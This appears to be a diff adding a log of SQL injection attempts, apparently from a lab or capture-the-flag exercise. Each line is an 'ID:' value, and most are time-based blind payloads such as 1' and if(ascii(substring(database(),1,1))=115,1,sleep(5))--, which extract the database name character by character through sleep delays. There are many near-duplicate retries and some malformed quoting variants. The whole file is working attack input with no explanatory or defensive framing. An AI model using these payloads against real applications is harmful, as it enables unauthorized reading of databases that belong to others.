@@ -1,0 +1,29 @@
+ID:1' and if(ascii(substring(database(),1,1))=115,1,sleep(5))-- 
+ID:"
+ID:""
+ID:""1
+ID:1' and if(1,sleep(5))-- 
+ID:1' and if(1,sleep(5))-- 
+ID:1' and if(1,sleep(5))-- 
+ID:1' and if(1,sleep(5))-- 
+ID:1' and if(1,1,sleep(5))-- 
+ID:1' and if(0,1,sleep(5))-- 
+ID:1' and if(0,1,sleep(5))-- 
+ID:1' and if(0,1,sleep(5))-- 
+ID:1' and if(0,1,sleep(5))-- 
+ID:1' and if(ascii(15)=14,1,sleep(5))-- 
+ID:1' and if(ascii(15)=14,1,sleep(5))-- 
+ID:1' and  1
+ID:1' and if(ascii(15)=14,1,sleep(5))-- 
+ID:1"27 and if(ascii(15)=14,1,sleep(5))-- 
+ID:1"27 and if(ascii(15)=14,1,sleep(5))-- 
+ID:1"27 and if(ascii(15)=14,sleep(5),sleep(5))-- 
+ID:1"27 and if(ascii(15)=14,1,sleep(5))-- 
+ID:1"27 and if(ascii(15)=14,1,sleep(5))-- 
+ID:1"27 and if(ascii(15)=14,1,sleep(5))-- 
+ID:1"27 and if(ascii(15)=14,1,sleep(5))-- 
+ID:1"27 and if(ascii(15)=14,1,sleep(5))-- 
+ID:1"27 and if(ascii(15)=14,1,sleep(5))-- 
+ID:1" and if(ascii(15)=14,1,sleep(5))-- 
+ID:1" and if(ascii(mid(database(),1,1))=14,1,sleep(5))-- 
+ID:1" and if(ascii(mid(database(),1,1))=115,1,sleep(5))-- 
